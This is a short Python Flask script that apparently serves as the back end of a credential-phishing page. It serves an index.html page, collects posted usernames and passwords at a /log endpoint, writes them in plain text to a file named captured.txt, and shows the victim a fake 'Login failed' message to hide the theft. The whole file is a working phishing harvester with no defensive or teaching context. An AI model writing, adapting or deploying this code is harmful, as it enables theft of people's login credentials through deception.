from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def index():
    return open("index.html").read()

@app.route('/log', methods=['POST'])
def log():
    user = request.form['user']
    password = request.form['pass']
    with open("captured.txt", "a") as f:
        f.write(f"Username: {user}, Password: {password}\n")
    return "Login failed. Please try again later."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)